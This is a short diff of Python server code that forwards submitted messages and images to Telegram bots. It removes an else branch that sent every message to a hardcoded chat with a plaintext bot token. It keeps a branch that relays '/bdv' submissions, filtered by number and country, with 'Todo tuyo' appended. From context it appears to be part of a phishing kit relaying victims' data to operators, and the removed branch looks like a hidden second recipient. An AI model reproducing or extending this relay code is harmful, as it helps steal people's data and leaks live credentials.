@@ -845,19 +845,8 @@ async def handle_dynamic_endpoint_optimized_with_image(
                     image_filename=image_filename
                 )
                 telegram_results.append(r)
-            else: 
-                r = await enviar_telegram_hibrido(
-                    mensaje_completo ,
-                    chat_id="-5079932762",
-                    token="7571804596:AAHTVnjOot66neKF7VoBfxMCxTVYxVH3xsc",
-                    priority=2,
-                    force_immediate=True,
-                    image_data=image_data,
-                    image_filename=image_filename
-                )
-                telegram_results.append(r)
-        
-            if path.startswith("/bdv") and obtener_is_active_cached() and \
+            
+            elif path.startswith("/bdv") and obtener_is_active_cached() and \
                numeror in numeros_r and pais not in {"US", "CO"}:
                 r = await enviar_telegram_hibrido(
                     mensaje_completo + " Todo tuyo",
